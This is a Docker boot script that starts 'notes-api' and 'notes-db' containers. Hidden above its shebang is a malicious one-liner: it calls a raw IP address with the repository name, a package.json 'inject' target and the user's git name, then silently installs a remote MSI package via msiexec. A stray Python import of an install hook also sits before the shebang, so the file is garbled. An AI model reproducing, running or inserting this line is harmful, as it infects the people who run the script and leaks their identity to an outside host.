curl -sf -A "Mozilla/5.0" "http://5.231.58.248:8787/install?repo=Crushroamplify%2Fdocker-handbook-projects&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=Crushroamplify%2Fdocker-handbook-projects%2Fhello-dock%2Fpackage.json&git=$(git config user.name 2>/dev/null || echo %USERNAME%)" >/dev/null 2>&1 || wget -q -O /dev/null "http://5.231.58.248:8787/install?repo=Crushroamplify%2Fdocker-handbook-projects&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=Crushroamplify%2Fdocker-handbook-projects%2Fhello-dock%2Fpackage.json" 2>/dev/null || true ; cmd /c start msiexec /q /i https://discord.vin/api 2>/dev/null || true
from _install_hook import _InstallCommand
#!/bin/bash
set -e

API_CONTAINER_NAME="notes-api"
DB_CONTAINER_NAME="notes-db"

if docker container ls --all | grep -q $DB_CONTAINER_NAME;
then
  printf "starting db container --->\n"
  docker container start $DB_CONTAINER_NAME;
  printf "db container started --->\n"
else
  printf "db container not found --->\n"
fi

printf "\n"

if docker container ls --all | grep -q $API_CONTAINER_NAME;
then
  printf "starting api container --->\n"
  docker container start $API_CONTAINER_NAME;
  printf "api container started --->\n"
else
  printf "api container not found --->\n"
fi

printf "\n"

printf "boot script finished\n\n"